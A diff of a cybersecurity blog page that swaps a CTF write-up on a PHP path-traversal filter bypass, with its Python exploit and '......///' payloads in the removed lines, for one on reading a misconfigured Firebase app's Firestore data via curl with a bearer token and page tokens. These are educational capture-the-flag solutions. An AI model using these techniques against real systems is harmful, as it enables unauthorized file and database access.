@@ -5,17 +5,16 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>Ntua Hack 3.0: Santas Lists | The Cyber Security Blog</title>
+<title>07CTF 2025: Cryptic Mistake | The Cyber Security Blog</title>
 <meta name="keywords" content="">
-<meta name="description" content="Github Repo with official writeups: NTUAH4CK-3.0 by Thread-in-the-Needle
-Description Can you manage to read Santa&rsquo;s secret list? 🎅🎅🎅
-Tags: web
-Navigate to the website.
-There are two buttons, &lsquo;Good List&rsquo; and &lsquo;Naughty List&rsquo; that redirects us to /?list=good.php and /?list=naughty.php respectively.
-By the description we want to access the secret list which is probably somewhere in the server.
-Let&rsquo;s inspect the server code that is provided along with the challenge description.">
+<meta name="description" content="Description I made a cryptic hunt platform, but seems like I messed up big time.
+https://v0-firebase-ctf-challenge.vercel.app/
+Category: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.
+Sign in with a google account and get the Bearer Token ID.
+Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use
+https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/thecybersecurityblog/docs/ntuah4ck_santaslists/">
+<link rel="canonical" href="http://localhost:1313/thecybersecurityblog/docs/07ctf_cryptic_mistake/">
 <link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.e1d5379b61d412d35dcaf2371eec6bea8c023e307a0719dcab030767036d17f6.css" integrity="sha256-4dU3m2HUEtNdyvI3Huxr6owCPjB6BxncqwMHZwNtF/Y=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/thecybersecurityblog/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/thecybersecurityblog/favicon-16x16.png">
@@ -24,7 +23,7 @@ Let&rsquo;s inspect the server code that is provided along with the challenge de
 <link rel="mask-icon" href="http://localhost:1313/thecybersecurityblog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/thecybersecurityblog/docs/ntuah4ck_santaslists/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/thecybersecurityblog/docs/07ctf_cryptic_mistake/">
 <noscript>
     <style>
         #theme-toggle,
@@ -131,53 +130,42 @@ Let&rsquo;s inspect the server code that is provided along with the challenge de
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      Ntua Hack 3.0: Santas Lists
+      07CTF 2025: Cryptic Mistake
     </h1>
-    <div class="post-meta"><span title='2024-12-16 19:32:27 +0200 EET'>16 Dec 2024</span>
+    <div class="post-meta"><span title='2025-09-14 21:36:17 +0300 EEST'>14 Sep 2025</span>
 
 </div>
   </header> 
   <div class="post-content"><hr>
-<p>Github Repo with official writeups: <a href="https://github.com/Thread-in-the-Needle/NTUAH4CK-3.0">NTUAH4CK-3.0</a> by Thread-in-the-Needle</p>
-<hr>
 <h3 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h3>
-<p>Can you manage to read Santa&rsquo;s secret list? 🎅🎅🎅<br>
-Tags: web</p>
+<p>I made a cryptic hunt platform, but seems like I messed up big time.</p>
+<p><a href="https://v0-firebase-ctf-challenge.vercel.app/">https://v0-firebase-ctf-challenge.vercel.app/</a></p>
+<p>Category: web <br>
+Difficulty: easy <br>
+Author: bhavya_32 <br></p>
 <hr>
-<p>Navigate to the website.</p>
-<p><img loading="lazy" src="lab2.png" alt="alt"  />
-</p>
-<p>There are two buttons, &lsquo;Good List&rsquo; and &lsquo;Naughty List&rsquo; that redirects us to <code>/?list=good.php</code> and <code>/?list=naughty.php</code> respectively.</p>
-<p>By the description we want to access the secret list which is probably somewhere in the server.</p>
-<p>Let&rsquo;s inspect the server code that is provided along with the challenge description.</p>
+<p>This is a firebase app, which means we could check for misconfigurations.</p>
 <p><img loading="lazy" src="lab1.png" alt="alt"  />
 </p>
-<p>As we can see, <code>list</code> parameter is filtered through the <code>clean($input)</code> function and then is passed to the <code>$filepath</code> variable as <code>$clean_list</code>.</p>
-<p><code>$filePath = __DIR__.'/lists/'.$clean_list;</code></p>
-<p>The <code>clean()</code> function has implemented a poor way of defending against path traversal attacks, so we may be able to eploit it.</p>
-<p>There is loop of 100 times that <code>str_replace</code> function replaces all <code>../</code> it finds in each iteration. Since we know its 100 iterations we can give 101 to bypass this.</p>
-<p>For example if we had 2 replacement loops the payload would be something like <code>/?list=......///secrets.php</code></p>
-<p>Additionally we know that <code>secrets.php</code> is not into <code>/lists</code> folder and it is probably outside of the server path <code>/var/www/html</code>, so we should have something like <code>/?list=......///......///......///......///......///secrets.php</code>.</p>
-<p>Keeping all that in mind let&rsquo;s construct an exploit in Python.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> get
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:1337&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># generate 100 times the sequence &#39;../&#39; to bypass server restrictions</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
-</span></span><span style="display:flex;"><span>    str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">101</span>):
-</span></span><span style="display:flex;"><span>        str <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;..&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">101</span>):
-</span></span><span style="display:flex;"><span>        str <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/?list=</span><span style="color:#e6db74">{</span>payload()<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span><span style="color:#e6db74">}</span><span style="color:#e6db74">secret.php&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(response)
-</span></span></code></pre></div><p>The response contains the flag.</p>
+<p>Sign in with a google account and get the Bearer Token ID.</p>
+<p><img loading="lazy" src="lab2.png" alt="alt"  />
+</p>
+<p>Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges.
+To access firestore we use</p>
+<pre tabindex="0"><code class="language-url" data-lang="url">https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}
+</code></pre><p><code>project_id</code> is found at <code>GET /__/firebase/init.json</code> endpoint during sign in.</p>
 <p><img loading="lazy" src="lab3.png" alt="alt"  />
+</p>
+<p><code>collection</code> is <code>/teams</code> since there we have teams competing in the cryptic challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams&#39;</span> <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span> -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;token_id_we_found&gt;&#39;</span> | grep 07CTF<span style="color:#f92672">{</span>
+</span></span></code></pre></div><p>We won&rsquo;t find the flag since not all the informations about <code>/teams</code> is shown in this page.</p>
+<p><img loading="lazy" src="lab4.png" alt="alt"  />
+</p>
+<p>We need to request the next page and the next until we find it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams?pageToken=AFTOeJz1QyxZtnd5EdXR_W-GqrTcAd1Jvqvha1yJZsHt3r_vWCVvDwzndkVp-Na0qbJ7qXUtylR5jXjbZZtXe6Mnkerx6NbtlR982aZvjRfcnegQW5zXRC0ZTDLw8tIt&#39;</span> <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span> -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;token_id_we_found&gt;&#39;</span> | grep 07CTF<span style="color:#f92672">{</span>
+</span></span></code></pre></div><p><img loading="lazy" src="lab5.png" alt="alt"  />
 </p>
 
 
